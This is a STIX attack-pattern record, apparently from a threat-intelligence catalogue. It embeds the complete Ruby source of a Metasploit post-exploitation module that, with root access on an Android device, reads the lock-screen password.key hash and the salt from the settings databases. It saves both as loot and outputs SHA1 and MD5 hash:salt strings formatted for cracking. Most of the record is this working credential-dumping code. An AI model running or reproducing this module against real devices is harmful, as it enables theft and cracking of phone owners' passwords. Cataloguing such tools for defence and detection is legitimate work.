{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--788ec31b-b08c-4e91-bff8-57c1e68fe470",
    "created": "2024-08-14T16:33:04.62306Z",
    "modified": "2024-08-14T16:33:04.623064Z",
    "name": "Android Gather Dump Password Hashes for Android Systems",
    "description": " Post Module to dump the password hashes for Android System. Root is required. To perform this operation, two things are needed.  First, a password.key file is required as this contains the hash but no salt.  Next, a sqlite3 database is needed (with supporting files) to pull the salt from.  Combined, this creates the hash we need.  Samsung based devices change the hash slightly.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/"
        },
        {
            "source_name": "reference",
            "url": "https://hashcat.net/forum/thread-2202.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'sqlite3'\nrequire 'fileutils'\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::File\n  include Msf::Post::Android::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Android Gather Dump Password Hashes for Android Systems',\n          'Description' => %q{\n            Post Module to dump the password hashes for Android System. Root is required.\n            To perform this operation, two things are needed.  First, a password.key file\n            is required as this contains the hash but no salt.  Next, a sqlite3 database\n            is needed (with supporting files) to pull the salt from.  Combined, this\n            creates the hash we need.  Samsung based devices change the hash slightly.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => ['h00die', 'timwr'],\n          'SessionTypes' => [ 'meterpreter', 'shell' ],\n          'Platform' => 'android',\n          'References' => [\n            ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],\n            ['URL', 'https://hashcat.net/forum/thread-2202.html'],\n          ]\n        }\n      )\n    )\n  end\n\n  def read_store_sql(location)\n    # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain\n    # the values we are looking for\n    db_loot_name = ''\n    file_name = File.basename(location)\n    ['', '-wal', '-shm'].each do |ext|\n      l = location + ext\n      unless file_exist?(l)\n        next\n      end\n\n      f = file_name + ext\n      data = read_file(l)\n      if data.blank?\n        print_error(\"Unable to read #{l}\")\n        return\n      end\n      print_good(\"Saved #{f} with length #{data.length}\")\n\n      if ext == ''\n        loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')\n        db_loot_name = loot_file\n        next\n      end\n\n      loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')\n\n      # in order for sqlite3 to see the -wal and -shm support files, we have to rename them\n      # we have to do this since the ext is > 3\n      # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391\n      new_name = \"#{db_loot_name}#{ext}\"\n      FileUtils.mv(loot_file, new_name)\n    end\n    SQLite3::Database.new(db_loot_name)\n  end\n\n  def run\n    unless is_root?\n      fail_with Failure::NoAccess, 'This module requires root permissions.'\n    end\n\n    manu = cmd_exec('getprop ro.product.manufacturer')\n\n    print_status('Attempting to determine unsalted hash.')\n    key_file = '/data/system/password.key'\n    unless file_exist?(key_file)\n      print_error('No password.key file, no password on device.')\n      return\n    end\n\n    hash = read_file(key_file)\n    if hash.empty?\n      print_error(\"Unable to read #{key_file}, and retrieve hash.\")\n      return\n    end\n    store_loot('Key', 'plain/text', session, hash, 'password.key', 'Android password hash key')\n    print_good('Saved password.key')\n\n    print_status('Attempting to determine salt')\n    os = cmd_exec('getprop ro.build.version.release')\n    vprint_status(\"OS Version: #{os}\")\n\n    locksettings_db = '/data/system/locksettings.db'\n    locksettings_sql = \"select value from locksettings where name='lockscreen.password_salt';\"\n    unless file_exist? locksettings_db\n      vprint_status(\"Could not find #{locksettings_db}, using settings.db\")\n      locksettings_db = '/data/data/com.android.providers.settings/databases/settings.db'\n      locksettings_sql = \"select value from secure where name='lockscreen.password_salt';\"\n    end\n\n    begin\n      vprint_status(\"Attempting to load lockscreen db: #{locksettings_db}\")\n      db = read_store_sql(locksettings_db)\n      if db.nil?\n        print_error('Unable to load settings.db file.')\n        return\n      end\n      salt = db.execute(locksettings_sql)\n    rescue SQLite3::SQLException\n      print_error(\"Failed to pull salt from database.  Command output: #{salt}\")\n      return\n    end\n\n    salt = salt[0][0] # pull string from results Command output: [[\"5381737017539487883\"]] may also be negative.\n\n    # convert from number string to hex and lowercase\n    salt = salt.to_i\n    salt += 2**64 if salt < 0 # deal with negatives\n    salt = salt.to_s(16)\n    print_good(\"Password Salt: #{salt}\")\n\n    sha1 = hash[0...40]\n    sha1 = \"#{sha1}:#{salt}\"\n    print_good(\"SHA1: #{sha1}\")\n    credential_data = {\n      # no way to tell them apart w/o knowing one is samsung or not.\n      jtr_format: manu =~ /samsung/i ? 'android-samsung-sha1' : 'android-sha1',\n      origin_type: :session,\n      post_reference_name: refname,\n      private_type: :nonreplayable_hash,\n      private_data: sha1,\n      session_id: session_db_id,\n      username: '',\n      workspace_id: myworkspace_id\n    }\n    create_credential(credential_data)\n\n    if hash.length > 40 # devices other than Samsungs have sha1+md5 combined into a single string\n      md5 = hash[40...72]\n      md5 = \"#{md5}:#{salt}\"\n      print_good(\"MD5: #{md5}\")\n      credential_data = {\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(md5),\n        origin_type: :session,\n        post_reference_name: refname,\n        private_type: :nonreplayable_hash,\n        private_data: md5,\n        session_id: session_db_id,\n        username: '',\n        workspace_id: myworkspace_id\n      }\n      create_credential(credential_data)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "android'"
    ]
}